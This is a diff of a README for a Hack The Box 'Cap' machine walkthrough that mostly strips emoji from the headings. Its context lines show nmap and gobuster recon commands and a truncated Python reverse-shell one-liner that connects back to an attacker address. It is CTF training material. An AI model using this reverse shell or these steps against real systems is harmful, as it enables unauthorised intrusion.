@@ -1,4 +1,4 @@
-# 🧪 Hack The Box — Cap (Easy) Walkthrough
+# Hack The Box — Cap (Easy) Walkthrough
 
 This repository contains my **Hack The Box** machine walkthrough for the *Cap* (Easy, Linux) box. The steps documented here replicate what I demonstrated in my YouTube video.
 
@@ -6,7 +6,7 @@ This repository contains my **Hack The Box** machine walkthrough for the *Cap* (
 
 ---
 
-## 🧠 Overview
+## Overview
 
 - **Machine Name:** Cap  
 - **Platform:** Hack The Box  
@@ -17,7 +17,7 @@ This repository contains my **Hack The Box** machine walkthrough for the *Cap* (
 
 ---
 
-## 🚀 Tools Used
+## Tools Used
 
 Make sure you have the following tools installed:
 
@@ -31,13 +31,13 @@ Make sure you have the following tools installed:
 
 ---
 
-## 🛠 Step‑by‑Step Walkthrough
+## Step‑by‑Step Walkthrough
 
 Below is the general attack path used against *Cap*.
 
 ---
 
-### 🔍 1. Initial Recon — Scan for Open Ports
+### 1. Recon — Scan for Open Ports
 
 ```bash
 nmap -sC -sV -oA nmap/initial 10.10.X.X
@@ -47,7 +47,7 @@ This scan identifies open ports and running services such as HTTP and SSH.
 
 ---
 
-### 🌐 2. HTTP Enumeration
+### 2. HTTP Enumeration
 
 Navigate to the web service in your browser:
 
@@ -65,14 +65,14 @@ gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt
 
 ---
 
-### 📦 3. Find Entry Point
+### 3. Find Entry Point
 
 During enumeration, a misconfiguration is discovered within the web application that exposes sensitive functionality.  
 This information can lead to credentials, access tokens, or other attack paths.
 
 ---
 
-### 🔓 4. Exploit User Access
+### 4. Exploit User Access
 
 Once valid access is identified, credentials are leveraged to gain user access to the system.
 
@@ -84,7 +84,7 @@ python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('10.10.X.
 
 ---
 
-### 📁 5. User Flag Capture
+### 5. User Flag Capture
 
 After gaining a shell, navigate to the user directory and retrieve the flag:
 
@@ -94,7 +94,7 @@ cat /home/youruser/user.txt
 
 ---
 
-### ⚡ 6. Privilege Escalation
+### 6. Privilege Escalation
 
 Local enumeration is performed to identify escalation vectors:
 
@@ -107,7 +107,7 @@ Automated tools such as `linpeas.sh` can assist in identifying misconfigurations
 
 ---
 
-### 🔐 7. Root Flag Capture
+### 7. Root Flag Capture
 
 After successfully escalating privileges, retrieve the root flag:
 
@@ -117,7 +117,7 @@ cat /root/root.txt
 
 ---
 
-## 📄 Notes & Observations
+## Notes & Observations
 
 - Focused service enumeration revealed the initial attack surface  
 - Web misconfiguration played a key role in gaining access  
@@ -125,7 +125,7 @@ cat /root/root.txt
 
 ---
 
-## 💡 Learning Outcomes
+## Learning Outcomes
 
 Completing this machine helped reinforce:
 
@@ -136,7 +136,7 @@ Completing this machine helped reinforce:
 
 ---
 
-## 🎥 Video Walkthrough
+## Video Walkthrough
 
 Full walkthrough video:  
 https://www.youtube.com/watch?v=7HdQ3ZoxclA&t=9s
